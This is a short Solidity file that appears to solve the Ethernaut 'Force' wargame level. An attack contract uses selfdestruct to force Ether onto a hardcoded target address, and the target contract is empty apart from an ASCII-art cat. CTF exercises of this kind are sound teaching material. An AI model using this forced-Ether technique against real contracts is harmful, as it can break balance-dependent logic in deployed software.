// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackForce {
    function forceAttacker() external payable {
        selfdestruct(payable(0xC2F3B266Bf68d7cB6B21D7c123735a421d47d960));
    }
}

contract Force {
    /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}
